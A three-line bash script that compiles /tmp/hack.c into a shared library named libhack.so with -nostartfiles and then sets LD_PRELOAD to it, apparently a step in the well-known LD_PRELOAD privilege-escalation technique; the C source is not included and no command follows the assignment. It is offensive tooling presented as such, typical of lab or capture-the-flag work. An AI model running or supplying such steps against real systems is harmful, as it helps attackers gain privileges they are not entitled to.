#!/bin/bash
gcc -shared -o libhack.so -nostartfiles -fpic /tmp/hack.c
LD_PRELOAD=./libhack.so
